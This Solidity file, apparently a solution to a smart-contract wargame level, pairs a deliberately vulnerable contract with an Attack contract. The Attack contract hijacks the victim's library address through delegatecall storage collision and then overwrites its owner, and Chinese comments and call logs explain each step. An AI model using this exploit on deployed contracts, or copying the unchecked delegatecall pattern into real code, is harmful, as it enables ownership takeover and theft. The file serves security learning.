pragma solidity >=0.7.0 <0.9.0;

contract Preservation {
    // public library contracts
    address public timeZoneLibrary;
    address public owner;
    uint public storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address timeA) public {
        timeZoneLibrary = timeA;
        owner = msg.sender;
    }

    // 把 _timeStamp 传入 Attack 合约地址, timeZoneLibrary 地址变成了 Attack 合约地址, 被篡改
    function setFirstTime(uint _timeStamp) public {
        // "args": {
        // 	"0": "in LibraryContract setTime", 在这个合约中 storedTime = _time, 即传入的 Attack 合约地址
        // 	"1": "0x9c84aBE0d64A1a27Fc82821f88ADAe290eaB5e07", Preservation 合约地址
        // 	"2": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4", 发送交易的地址
        // 	"3": "643688864680761734326275332710199093134929571915" Attack 合约地址
        // } 作用于 Preservation 合约地址, 所以 timeZone1Library 被覆盖。
        address(timeZoneLibrary).delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    }

    // 调用 setFirstTime 可以看到此时 timeZoneLibrary 已经被修改为我们的攻击 Attack 合约，此时再调用 setSecondTime 函数即可成功更改 owner 变量
    function setSecondTime(uint _timeStamp) public {
        // "args": {
        // 	"0": "in Attack setTime",
        // 	"1": "0x9c84aBE0d64A1a27Fc82821f88ADAe290eaB5e07", Preservation 合约地址
        // 	"2": "0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2", 新发送交易的地址
        // 	"3": "0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2", 新发送交易的地址
        // 	"4": "643688864680761734326275332710199093134929571915"
        // } Preservation 合约地址中的 owner 变量被修改为 新发送交易的地址
        address(timeZoneLibrary).delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    }
}

contract LibraryContract {
    // stores a timestamp
    uint public storedTime;

    event LogString(string, address, address, uint);
    function setTime(uint _time) public {
        storedTime = _time;
        emit LogString("in LibraryContract setTime", address(this), msg.sender, _time);
    }
}

contract Attack {
    uint padding1; // 位置补齐
    address public owner;

    event LogString(string, address, address, address, uint);
    function setTime(uint _time) public {
        owner = tx.origin;
        emit LogString("in Attack setTime", address(this), msg.sender, tx.origin, _time);
    }
}